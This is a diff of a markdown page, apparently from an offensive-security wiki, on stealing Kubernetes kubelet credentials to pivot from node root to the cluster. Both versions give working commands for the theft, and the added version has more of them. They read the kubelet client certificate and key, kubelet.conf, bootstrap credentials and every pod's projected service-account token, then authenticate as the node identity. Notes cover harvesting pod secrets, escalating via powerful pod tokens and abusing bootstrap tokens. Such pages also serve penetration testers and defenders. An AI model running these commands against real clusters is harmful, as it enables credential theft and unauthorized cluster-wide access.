@@ -1,32 +1,53 @@
 ---
-title: "Kubelet credential theft: taking the node identity to reach the cluster"
-description: "Widening a Kubernetes node foothold to the cluster by stealing the node's kubelet client certificate and kubeconfig, then acting as the node identity to read the secrets of every pod scheduled on it and, through node permissions, beyond."
+title: "Kubelet credential theft: stealing the node identity to pivot to the cluster"
+description: "Each node's kubelet authenticates to the API server with a client certificate and holds the bootstrap and node credentials on disk. An attacker who reaches the node filesystem steals the kubelet client certificate and the projected tokens of every pod on the node, pivoting from node root to broad cluster access through the node's own identity and its pods' identities."
 keywords:
-  - kubelet credentials
-  - node identity
-  - kubelet.conf
-  - node authorization
+  - kubelet
+  - node credentials
+  - client certificate
+  - bootstrap token
   - cluster pivot
 ---
 
 # Kubelet credential theft
 
-Once on a node, the kubelet's credentials are the prize. The node authenticates to the API as `system:node:<name>` using a client certificate and kubeconfig on disk. Taking them lets an attacker act as the node, which the Node authorization mode allows to read the secrets of pods scheduled there, among other node-scoped rights.
+Owning a node is not the end goal; the node's credentials are the pivot to the cluster. The kubelet authenticates to the API server with a client certificate stored on the node, the node may hold a bootstrap token used to join, and every pod scheduled to the node has its projected service-account token on disk. Harvesting these turns node root into the node's own cluster identity plus the identities of all its pods.
+
+Collect the credentials from the node filesystem:
 
 ```bash
-cat /etc/kubernetes/kubelet.conf                      # node kubeconfig
-ls /var/lib/kubelet/pki/                              # kubelet client cert/key
-# Act as the node identity
-kubectl --kubeconfig /etc/kubernetes/kubelet.conf auth can-i --list
+# kubelet client certificate and key (the node's API identity)
+ls -l /var/lib/kubelet/pki/
+cat /var/lib/kubelet/pki/kubelet-client-current.pem      # cert+key, system:node:<name>
+# the kubelet kubeconfig points at the API server and this cert
+cat /etc/kubernetes/kubelet.conf 2>/dev/null
+# bootstrap credentials, if the node still has them
+cat /etc/kubernetes/bootstrap-kubelet.conf 2>/dev/null
+# every pod's projected service-account token on this node
+cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
 ```
+
+## Using the node identity
+
+```bash
+# authenticate as the node (system:node:<name>, in the system:nodes group)
+kubectl --client-certificate=kubelet-client-current.pem \
+  --client-key=kubelet-client-current.pem \
+  --server=https://<apiserver>:6443 --insecure-skip-tls-verify get nodes
+# the Node authorizer lets a node read the secrets and configmaps of pods
+# scheduled to it; enumerate those, then use the richest pod token found
+```
+
+The node identity is scoped by the Node authorization mode to resources tied to its own pods, but that already includes those pods' secrets; a pod token belonging to a powerful service account escalates further.
 
 ## Exploitation notes
 
-- The node identity can read secrets and configmaps of pods on that node; scheduling a target's workload onto a controlled node (or waiting for it) widens the reach.
-- Node credentials plus the materialized secrets under `/var/lib/kubelet/pods/*/volumes/` sweep up every token mounted on the node.
-- This is how one escaped pod becomes cluster-wide movement, feeding [Lateral movement](../lateral-movement/index.md).
+- The kubelet client certificate authenticates as `system:node:<name>` in the `system:nodes` group; the Node authorizer grants it read of the secrets and configmaps of pods bound to that node, which is a broad secret harvest.
+- Projected pod tokens on the node are often the bigger prize: a controller or system pod scheduled there carries a service account with wide RBAC; decode each and test it per [Service account token to API](../lateral-movement/service-account-token-to-api.md).
+- A bootstrap token, if present, can enroll attacker-controlled nodes or be reused depending on cluster configuration; treat it as a durable credential.
 
 ## References
 
-- [Kubernetes: using node authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/)
-- [Kubernetes: kubelet authentication and authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
+- [Kubernetes: node authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/)
+- [Kubernetes: kubelet TLS bootstrapping](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-tls-bootstrapping/)
+- [HackTricks: Kubernetes node pivot](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
